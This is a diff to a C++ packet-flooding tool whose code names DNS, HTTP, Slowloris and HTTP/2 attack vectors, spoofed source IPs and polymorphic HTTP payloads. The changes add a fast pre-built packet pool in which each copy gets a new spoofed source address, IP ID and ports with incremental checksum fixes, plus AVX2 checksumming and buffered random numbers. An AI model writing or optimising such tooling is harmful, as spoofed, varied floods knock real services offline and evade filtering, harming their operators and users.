@@ -30,14 +30,27 @@ std::mt19937_64& rng() {
   return gen;
 }
 
+uint32_t fast_rand32() {
+  thread_local std::array<uint32_t, 256> buf;
+  thread_local size_t idx = 256;
+  if (idx == 256) {
+    auto& g = rng();
+    for (size_t i = 0; i < 256; ++i) buf[i] = static_cast<uint32_t>(g());
+    idx = 0;
+  }
+  return buf[idx++];
+}
+
 uint32_t rand_u32(uint32_t lo, uint32_t hi) {
-  std::uniform_int_distribution<uint32_t> dist(lo, hi);
-  return dist(rng());
+  if (lo >= hi) return lo;
+  uint64_t range = static_cast<uint64_t>(hi) - static_cast<uint64_t>(lo) + 1;
+  return lo + static_cast<uint32_t>(fast_rand32() % range);
 }
 
 int rand_int(int lo, int hi) {
-  std::uniform_int_distribution<int> dist(lo, hi);
-  return dist(rng());
+  if (lo >= hi) return lo;
+  uint64_t range = static_cast<uint64_t>(hi) - static_cast<uint64_t>(lo) + 1;
+  return lo + static_cast<int>(fast_rand32() % range);
 }
 
 void append_u8(std::vector<uint8_t>& out, uint8_t v) { out.push_back(v); }
@@ -57,6 +70,28 @@ void append_be32(std::vector<uint8_t>& out, uint32_t v) {
 void write_be16(std::vector<uint8_t>& out, size_t off, uint16_t v) {
   out.at(off) = static_cast<uint8_t>((v >> 8) & 0xFF);
   out.at(off + 1) = static_cast<uint8_t>(v & 0xFF);
+}
+
+void write_be16(uint8_t* p, size_t off, uint16_t v) {
+  p[off] = static_cast<uint8_t>((v >> 8) & 0xFF);
+  p[off + 1] = static_cast<uint8_t>(v & 0xFF);
+}
+
+uint16_t checksum_update(uint16_t old_csum, uint16_t old_val, uint16_t new_val) {
+  uint32_t csum = (~old_csum) & 0xFFFF;
+  csum += (~old_val) & 0xFFFF;
+  csum += new_val;
+  csum = (csum & 0xFFFF) + (csum >> 16);
+  return static_cast<uint16_t>(~csum);
+}
+
+uint16_t checksum_update_32(uint16_t old_csum, uint32_t old_val, uint32_t new_val) {
+  uint16_t old_hi = (old_val >> 16) & 0xFFFF;
+  uint16_t old_lo = old_val & 0xFFFF;
+  uint16_t new_hi = (new_val >> 16) & 0xFFFF;
+  uint16_t new_lo = new_val & 0xFFFF;
+  uint16_t temp = checksum_update(old_csum, old_hi, new_hi);
+  return checksum_update(temp, old_lo, new_lo);
 }
 
 uint16_t read_be16(const uint8_t* p) {
@@ -131,7 +166,9 @@ const OSProfile& select_profile() {
       if (to_lower(profile.name) == wanted) return profile;
     }
   }
-  return profiles.at(static_cast<size_t>(rand_int(0, static_cast<int>(profiles.size()) - 1)));
+  int max_idx = static_cast<int>(profiles.size()) - 1;
+  if (max_idx <= 0) return profiles.at(0);
+  return profiles.at(static_cast<size_t>(rand_int(0, max_idx)));
 }
 
 std::vector<uint8_t> bytes_from_string(const std::string& s) {
@@ -162,9 +199,38 @@ uint16_t finalize_sum(uint32_t s) {
 
 // Zero-copy checksum helper: accumulates partial sum over a buffer without
 // allocating or copying. Callers chain multiple buffers then finalize once.
+#include <immintrin.h>
 uint32_t checksum_partial(const uint8_t* data, size_t len) {
   uint32_t s = 0;
   size_t i = 0;
+
+#if defined(__AVX2__)
+  __m256i vsum = _mm256_setzero_si256();
+  __m256i zero = _mm256_setzero_si256();
+
+  while (i + 32 <= len) {
+      __m256i v = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(data + i));
+      
+      __m256i v_lo = _mm256_unpacklo_epi16(v, zero);
+      __m256i v_hi = _mm256_unpackhi_epi16(v, zero);
+      
+      vsum = _mm256_add_epi32(vsum, v_lo);
+      vsum = _mm256_add_epi32(vsum, v_hi);
+      i += 32;
+  }
+  
+  __m256i v_sum1 = _mm256_hadd_epi32(vsum, vsum);
+  __m256i v_sum2 = _mm256_hadd_epi32(v_sum1, v_sum1);
+  __m128i v_sum128_hi = _mm256_extracti128_si256(v_sum2, 1);
+  __m128i v_sum128_lo = _mm256_castsi256_si128(v_sum2);
+  __m128i v_sum128 = _mm_add_epi32(v_sum128_hi, v_sum128_lo);
+  
+  uint32_t simd_sum = static_cast<uint32_t>(_mm_cvtsi128_si32(v_sum128));
+  
+  while (simd_sum >> 16) simd_sum = (simd_sum & 0xFFFFu) + (simd_sum >> 16);
+  s += ((simd_sum & 0xFF) << 8) | ((simd_sum >> 8) & 0xFF);
+#endif
+
   while (i + 1 < len) {
     s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
     i += 2;
@@ -189,8 +255,9 @@ std::vector<uint8_t> profile_tcp_options(const OSProfile& profile) {
 
 std::string choose_dns_qtype(const PacketConfig& cfg) {
   if (cfg.dns_qtypes.empty()) return "A";
-  if (cfg.dns_qtypes.size() == 1) return cfg.dns_qtypes.front();
-  return cfg.dns_qtypes.at(static_cast<size_t>(rand_int(0, static_cast<int>(cfg.dns_qtypes.size()) - 1)));
+  int max_idx = static_cast<int>(cfg.dns_qtypes.size()) - 1;
+  if (max_idx <= 0) return cfg.dns_qtypes.front();
+  return cfg.dns_qtypes.at(static_cast<size_t>(rand_int(0, max_idx)));
 }
 
 std::vector<uint8_t> maybe_pad(std::vector<uint8_t> packet, int pad_size, bool is_syn_only) {
@@ -210,9 +277,10 @@ std::vector<uint8_t> polymorphic_http_payload(const std::string& target_ip,
       "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Safari/604.1",
   };
+  int agent_max = static_cast<int>(agents.size()) - 1;
   std::vector<std::pair<std::string, std::string>> headers = {
       {"Host", target_ip},
-      {"User-Agent", agents.at(static_cast<size_t>(rand_int(0, static_cast<int>(agents.size()) - 1)))},
+      {"User-Agent", agents.at(static_cast<size_t>(agent_max <= 0 ? 0 : rand_int(0, agent_max)))},
       {"Accept", "*/*"},
       {"Accept-Language",
        std::array<std::string, 3>{"en-US,en;q=0.5", "tr-TR,tr;q=0.9", "de-DE,de;q=0.8"}.at(
@@ -246,9 +314,39 @@ const uint8_t* PacketPoolBuffer::data() const { return storage ? storage->data()
 
 size_t PacketPoolBuffer::size() const { return storage ? storage->size() : 0; }
 
+#include <immintrin.h>
+
 uint16_t checksum(const uint8_t* data, size_t len) {
   uint32_t s = 0;
   size_t i = 0;
+
+#if defined(__AVX2__)
+  __m256i vsum = _mm256_setzero_si256();
+  __m256i zero = _mm256_setzero_si256();
+
+  while (i + 32 <= len) {
+      __m256i v = _mm256_loadu_si256(reinterpret_cast<const __m256i*>(data + i));
+      
+      __m256i v_lo = _mm256_unpacklo_epi16(v, zero);
+      __m256i v_hi = _mm256_unpackhi_epi16(v, zero);
+      
+      vsum = _mm256_add_epi32(vsum, v_lo);
+      vsum = _mm256_add_epi32(vsum, v_hi);
+      i += 32;
+  }
+  
+  __m256i v_sum1 = _mm256_hadd_epi32(vsum, vsum);
+  __m256i v_sum2 = _mm256_hadd_epi32(v_sum1, v_sum1);
+  __m128i v_sum128_hi = _mm256_extracti128_si256(v_sum2, 1);
+  __m128i v_sum128_lo = _mm256_castsi256_si128(v_sum2);
+  __m128i v_sum128 = _mm_add_epi32(v_sum128_hi, v_sum128_lo);
+  
+  uint32_t simd_sum = static_cast<uint32_t>(_mm_cvtsi128_si32(v_sum128));
+  
+  while (simd_sum >> 16) simd_sum = (simd_sum & 0xFFFFu) + (simd_sum >> 16);
+  s += ((simd_sum & 0xFF) << 8) | ((simd_sum >> 8) & 0xFF);
+#endif
+
   while (i + 1 < len) {
     s += (static_cast<uint32_t>(data[i]) << 8) | static_cast<uint32_t>(data[i + 1]);
     i += 2;
@@ -416,7 +514,8 @@ std::string get_spoofed_ip(const std::string& mode,
   if (mode == "list" && list_file) {
     const auto ips = load_ips_from_file(*list_file);
     if (!ips.empty()) {
-      return ips.at(static_cast<size_t>(rand_int(0, static_cast<int>(ips.size()) - 1)));
+      int max_idx = static_cast<int>(ips.size()) - 1;
+      return ips.at(static_cast<size_t>(max_idx <= 0 ? 0 : rand_int(0, max_idx)));
     }
     return generate_random_ip();
   }
@@ -797,11 +896,17 @@ std::vector<uint8_t> build_polymorphic_http_packet(const PacketConfig& cfg) {
   return packet;
 }
 
-std::vector<uint8_t> create_packet(const PacketConfig& cfg) {
+using PacketBuilder = std::vector<uint8_t>(*)(const PacketConfig&);
+
+PacketBuilder resolve_packet_builder(const PacketConfig& cfg) {
   const std::string vector = to_lower(cfg.attack_vector);
-  if (vector == "dns") return build_dns_packet(cfg);
-  if (vector == "http" || vector == "slowloris" || vector == "http2") return build_polymorphic_http_packet(cfg);
-  return build_transport_packet(cfg);
+  if (vector == "dns") return build_dns_packet;
+  if (vector == "http" || vector == "slowloris" || vector == "http2") return build_polymorphic_http_packet;
+  return build_transport_packet;
+}
+
+std::vector<uint8_t> create_packet(const PacketConfig& cfg) {
+  return resolve_packet_builder(cfg)(cfg);
 }
 
 std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_impl(const PacketConfig& cfg,
@@ -811,11 +916,88 @@ std::tuple<std::shared_ptr<std::vector<uint8_t>>, size_t> generate_packet_pool_i
   if (count <= 0) return {std::make_shared<std::vector<uint8_t>>(), 0};
 
   auto storage = std::make_shared<std::vector<uint8_t>>();
+  const std::string vector = to_lower(cfg.attack_vector);
+  
+  // Resolve builder once (Branch prediction optimization)
+  PacketBuilder builder = resolve_packet_builder(cfg);
+  
+  // Polymorphic packets cannot be easily mutated due to varying sizes and payloads.
+  bool can_mutate = uniform_size && (vector != "http" && vector != "slowloris" && vector != "http2" && vector != "dns");
+
+  if (can_mutate) {
+    auto template_pkt = builder(cfg);
+    size_t pkt_size = (template_pkt.size() + 3u) & ~3u;
+    storage->assign(static_cast<size_t>(count) * pkt_size, 0);
+
+    const int ihl = (template_pkt[0] & 0x0F) * 4;
+    const uint8_t proto = template_pkt[9];
+    
+    for (int i = 0; i < count; ++i) {
+      size_t offset = static_cast<size_t>(i) * pkt_size;
+      std::copy(template_pkt.begin(), template_pkt.end(), storage->data() + offset);
+
+      if (i == 0) continue; // First packet is already perfect
+
+      uint8_t* pkt_ptr = storage->data() + offset;
+
+      // Mutate IP ID
+      uint16_t old_id = read_be16(pkt_ptr + 4);
+      uint16_t new_id = static_cast<uint16_t>(rand_int(1, 0xFFFF));
+      write_be16(pkt_ptr, 4, new_id);
+      
+      uint16_t ip_csum = read_be16(pkt_ptr + 10);
+      ip_csum = checksum_update(ip_csum, old_id, new_id);
+
+      // Mutate source IP if spoofing
+      uint32_t new_src_ip = 0;
+      uint32_t old_src_ip = (static_cast<uint32_t>(pkt_ptr[12]) << 24) | (static_cast<uint32_t>(pkt_ptr[13]) << 16) | (static_cast<uint32_t>(pkt_ptr[14]) << 8) | pkt_ptr[15];
+      
+      if (cfg.spoof) {
+          const std::string new_src = get_spoofed_ip(cfg.spoof_opts.mode, cfg.spoof_opts.subnet, cfg.spoof_opts.list_file);
+          new_src_ip = static_cast<uint32_t>(ip_to_int(new_src));
+          
+          pkt_ptr[12] = (new_src_ip >> 24) & 0xFF;
+          pkt_ptr[13] = (new_src_ip >> 16) & 0xFF;
+          pkt_ptr[14] = (new_src_ip >> 8) & 0xFF;
+          pkt_ptr[15] = new_src_ip & 0xFF;
+          
+          ip_csum = checksum_update_32(ip_csum, old_src_ip, new_src_ip);
+      }
+      write_be16(pkt_ptr, 10, ip_csum);
+
+      // Mutate L4
+      if (proto == PROTO_TCP) {
+          uint16_t old_port = read_be16(pkt_ptr + ihl);
+          uint16_t new_port = static_cast<uint16_t>(rand_int(1024, 65535));
+          write_be16(pkt_ptr, ihl, new_port);
+          
+          uint16_t tcp_csum = read_be16(pkt_ptr + ihl + 16);
+          tcp_csum = checksum_update(tcp_csum, old_port, new_port);
+          if (cfg.spoof) tcp_csum = checksum_update_32(tcp_csum, old_src_ip, new_src_ip);
+          
+          write_be16(pkt_ptr, ihl + 16, tcp_csum);
+      } else if (proto == PROTO_UDP) {
+          uint16_t old_port = read_be16(pkt_ptr + ihl);
+          uint16_t new_port = static_cast<uint16_t>(rand_int(1024, 65535));
+          write_be16(pkt_ptr, ihl, new_port);
+          
+          uint16_t udp_csum = read_be16(pkt_ptr + ihl + 6);
+          if (udp_csum != 0) {
+              udp_csum = checksum_update(udp_csum, old_port, new_port);
+              if (cfg.spoof) udp_csum = checksum_update_32(udp_csum, old_src_ip, new_src_ip);
+              write_be16(pkt_ptr, ihl + 6, udp_csum == 0 ? 0xFFFF : udp_csum);
+          }
+      }
+    }
+    return {storage, pkt_size};
+  }
+
+  // Fallback for polymorphic / un-mutable packets
   size_t pkt_size = 0;
   std::vector<std::vector<uint8_t>> packets;
   packets.reserve(static_cast<size_t>(count));
   for (int i = 0; i < count; ++i) {
-    auto pkt = create_packet(cfg);
+    auto pkt = builder(cfg);
     if (uniform_size) pkt_size = std::max(pkt_size, (pkt.size() + 3u) & ~3u);
     packets.push_back(std::move(pkt));
   }
